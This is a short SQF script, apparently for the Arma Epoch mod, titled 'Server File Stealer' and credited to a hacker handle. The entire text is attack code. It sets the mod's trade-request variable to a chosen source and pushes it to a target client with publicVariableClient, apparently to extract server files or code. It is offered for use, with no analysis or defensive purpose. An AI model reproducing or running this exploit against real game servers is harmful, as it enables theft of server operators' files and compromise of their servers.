//Server File Stealer//
//Created By Lystic//


private ["_target","_source"];
_target = _this select 0;
_source = _this select 1;
if (!isNull _target && !isNull _source) then{
EPOCH_TRADE_REQ = _source;
(owner _target) publicVariableClient "EPOCH_TRADE_REQ";
};